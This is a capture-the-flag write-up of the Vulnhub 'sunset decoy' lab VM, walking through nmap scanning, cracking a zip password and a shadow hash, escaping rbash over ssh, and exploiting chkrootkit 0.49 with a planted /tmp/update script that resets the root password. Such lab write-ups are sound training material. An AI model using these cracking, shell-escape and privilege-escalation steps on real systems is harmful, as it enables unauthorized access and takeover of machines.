---
title: Vulnhub - sunset decoy
description: My writeup on sunset decoy box.
categories:
 - vulnhub
tags: vulnhub
---

![](https://pbs.twimg.com/media/Dsh2wzTWkAEgsd0.jpg)

Hi all, just pwned this fresh new vulnhub box. A good one to relax after a hard day, let's pwn it!

You can find the machine there > [sunset decoy](https://www.vulnhub.com/entry/sunset-decoy,505/){:target="_blank"}

## Enumeration/Reconnaissance

Let's start always with nmap.

```
$ ip=192.168.1.123
$ nmap -sC -sV -p- -oN nmap/initial $ip
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-10 02:30 EEST
Nmap scan report for 60832e9f188106ec5bcc4eb7709ce592.zte.com.cn (192.168.1.123)
Host is up (0.00057s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 a9:b5:3e:3b:e3:74:e4:ff:b6:d5:9f:f1:81:e7:a4:4f (RSA)
|   256 ce:f3:b3:e7:0e:90:e2:64:ac:8d:87:0f:15:88:aa:5f (ECDSA)
|_  256 66:a9:80:91:f3:d8:4b:0a:69:b0:00:22:9f:3c:4c:5a (ED25519)
80/tcp open  http    Apache httpd 2.4.38
| http-ls: Volume /
| SIZE  TIME              FILENAME
| 3.0K  2020-07-07 16:36  save.zip
|_
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Index of /
MAC Address: 08:00:27:11:D0:A3 (Oracle VirtualBox virtual NIC)
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Webpage has only a `save.zip` file let's download it.

```
$ wget -q http://$ip/save.zip
decoy unzip save.zip 
Archive:  save.zip
[save.zip] etc/passwd password: 
```

Needs a password, no problem. Let's fire up my favorite `fcrackzip`:

```
$ fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt save.zip 

PASSWORD FOUND!!!!: pw == manuel
$ decoy unzip -P manuel save.zip 
Archive:  save.zip
  inflating: etc/passwd              
  inflating: etc/shadow              
  inflating: etc/group               
  inflating: etc/sudoers             
  inflating: etc/hosts               
 extracting: etc/hostname 
```

Seems like a copy of `/etc`, let's focus on `shadow` file since it contains user passwords in encrypted format. I saved the user password in a file and i'll run john on it.

```
$ cat password 
296640a3b825115a47b68fc44501c828:$6$x4sSRFte6R6BymAn$zrIOVUCwzMlq54EjDjFJ2kfmuN7x2BjKPdir2Fuc9XRRJEk9FNdPliX4Nr92aWzAtykKih5PX39OKCvJZV0us.
$ john --wordlist=/usr/share/wordlists/rockyou.txt password
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
server           (296640a3b825115a47b68fc44501c828)
1g 0:00:00:06 DONE (2020-07-10 02:36) 0.1631g/s 2798p/s 2798c/s 2798C/s felton..Hunter
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Bingo! ;) Let's login in:

```
$ ssh 296640a3b825115a47b68fc44501c828@$ip
296640a3b825115a47b68fc44501c828@192.168.1.123's password: 
Linux 60832e9f188106ec5bcc4eb7709ce592 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Jul  9 19:03:50 2020 from 192.168.1.16
-rbash: dircolors: command not found
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ cd
-rbash: cd: restricted
```

Oh we're into `rbash`!

`rbash = restricted shell` Restricts some of the system capabilities like commands etc 

Here we can do a trick to bypass it with ssh:

```
$ ssh 296640a3b825115a47b68fc44501c828@$ip -t "bash --noprofile"
296640a3b825115a47b68fc44501c828@192.168.1.123's password: 
bash: dircolors: command not found
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ whoami
bash: whoami: command not found
```

All the commands now return `command not found`, we have to fix the `PATH`:

```
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ echo $PATH
PATH:/home/296640a3b825115a47b68fc44501c828/
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ PATH=/usr/lib/lightdm/lightdm:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ whoami;id
296640a3b825115a47b68fc44501c828
uid=1000(296640a3b825115a47b68fc44501c828) gid=1000(296640a3b825115a47b68fc44501c828) groups=1000(296640a3b825115a47b68fc44501c828)
```

Now privesc is simple, we can see this `SV-502` directory in home. If we follow it we can see a `log.txt` that provide a really useful information:

`2020/06/27 18:56:58 CMD: UID=0    PID=12386  | tar -xvzf chkrootkit-0.49.tar.gz`

System runs a vulnerable version of `chkrootkit`, let's search for possible exploits.

```
$ searchsploit chkrootkit
------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                         |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Chkrootkit - Local Privilege Escalation (Metasploit)                                                                                                   | linux/local/38775.rb
Chkrootkit 0.49 - Local Privilege Escalation                                                                                                           | linux/local/33899.txt
```

Let's read `linux/local/33899.txt`:

```
Steps to reproduce:

- Put an executable file named 'update' with non-root owner in /tmp (not
mounted noexec, obviously)
```

`update` file under `/tmp` will be executed as root. We can simply change root password!

```
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$ touch update; chmod +x update
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$ nano update 
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$ cat update
#!/bin/bash
echo 'root:pwned' | sudo chpasswd
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$ su - root
Password: 
root@60832e9f188106ec5bcc4eb7709ce592:~# whoami
root
```

Perfect! ;) Let's read the flag:

```
root@60832e9f188106ec5bcc4eb7709ce592:~# cat root.txt
  ........::::::::::::..           .......|...............::::::::........
     .:::::;;;;;;;;;;;:::::.... .     \   | ../....::::;;;;:::::.......
         .       ...........   / \\_   \  |  /     ......  .     ........./\
...:::../\\_  ......     ..._/'   \\\_  \###/   /\_    .../ \_.......   _//
.::::./   \\\ _   .../\    /'      \\\\#######//   \/\   //   \_   ....////
    _/      \\\\   _/ \\\ /  x       \\\\###////      \////     \__  _/////
  ./   x       \\\/     \/ x X           \//////                   \/////
 /     XxX     \\/         XxX X                                    ////   x
-----XxX-------------|-------XxX-----------*--------|---*-----|------------X--
       X        _X      *    X      **         **             x   **    *  X
      _X                    _X           x                *          x     X_


1c203242ab4b4509233ca210d50d2cc5

Thanks for playing! - Felipe Winsnes (@whitecr0wz)
```

Fun box! :)




